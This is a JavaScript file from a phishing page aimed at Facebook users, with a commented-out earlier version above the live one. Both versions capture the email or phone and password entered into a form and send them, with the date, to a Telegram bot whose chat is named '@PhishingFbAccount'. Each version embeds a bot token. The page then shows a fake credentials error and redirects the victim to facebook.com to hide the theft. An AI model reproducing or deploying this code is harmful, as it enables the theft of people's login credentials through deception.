// "use strict";
// const form = document.querySelector(".form");
// form.addEventListener("submit", function (e) {
//   e.preventDefault();
//   sendMessage(form);
// });
// const date = new Date();
// const SortDate = date.toLocaleDateString(); 
// console.log(date);

// async function sendMessage(form) {
//   const formData = new FormData(form);
//   const EmailOrPhone = formData.get("EmailOrPhone");
//   const Password = formData.get("Password");

//   const content = `<b>EmailOrPhone:</b> ${EmailOrPhone}\n<b>Password:</b> ${Password}\n<b>Date: </b>${SortDate}`;

//   const apiToken = "8155002295:AAGwo21L6VQ0XRrGKSW4Qj9rb116stUuYog";
//   const chatId = "@MaSendMessageBots";
//   const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
//     content
//   )}&parse_mode=HTML`;
//   try {
//     const response = await fetch(url);
//     if (response.ok) {
//       form.reset();
//       Swal.fire({
//         title: "<i>Error</i>",
//         html: "Please check your credentials and try again.",
//         icon: "error",
//         confirmButtonText: "Try with app",
//         customClass: {
//           confirmButton: "custom-button", // custom button
//         },
//       }).then((result) => {
//         if (result.isConfirmed) {
//           window.location.href = "https://www.facebook.com";
//         }
//       });
//       // alert("Sent to telegram");
//     } else {
//       alert("Error sending form.");
//     }
//   } catch (error) {
//     Swal.fire({
//       title: "<i>Error</i>",
//       html: "Network error. Please try again.",
//       icon: "error",
//       confirmButtonText: "Try again",
//       customClass: {
//         confirmButton: "custom-button", // custom button
//       },
//     });
//     form.reset();
//     // alert("Network error. Please try again.");
//     console.error("Error:", error);
//   }
// }
"use strict";
const form = document.querySelector(".form");
form.addEventListener("submit", function (e) {
  e.preventDefault();
  sendMessage(form);
});

const date = new Date();
const SortDate = date.toLocaleDateString();

async function sendMessage(form) {
  const formData = new FormData(form);
  const EmailOrPhone = formData.get("EmailOrPhone");
  const Password = formData.get("Password");

  const content = `<b>EmailOrPhone:</b> ${EmailOrPhone}\n<b>Password:</b> ${Password}\n<b>Date: </b>${SortDate}`;

  const apiToken = "7600058906:AAHBa9boIgFIQ9iQovqAeKy5_JP7OXnvdgY"; // Updated token
  const chatId = "@PhishingFbAccount"; // Update with the actual chat ID or group username
  const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    content
  )}&parse_mode=HTML`;

  try {
    const response = await fetch(url);
    if (response.ok) {
      form.reset();
      Swal.fire({
        title: "<i>Error</i>",
        html: "Please check your credentials and try again.",
        icon: "error",
        confirmButtonText: "Try with app",
        customClass: {
          confirmButton: "custom-button", // custom button
        },
      }).then((result) => {
        if (result.isConfirmed) {
          window.location.href = "https://www.facebook.com";
        }
      });
    } else {
      alert("Error sending form.");
    }
  } catch (error) {
    Swal.fire({
      title: "<i>Error</i>",
      html: "Network error. Please try again.",
      icon: "error",
      confirmButtonText: "Try again",
      customClass: {
        confirmButton: "custom-button", // custom button
      },
    });
    form.reset();
    console.error("Error:", error);
  }
}
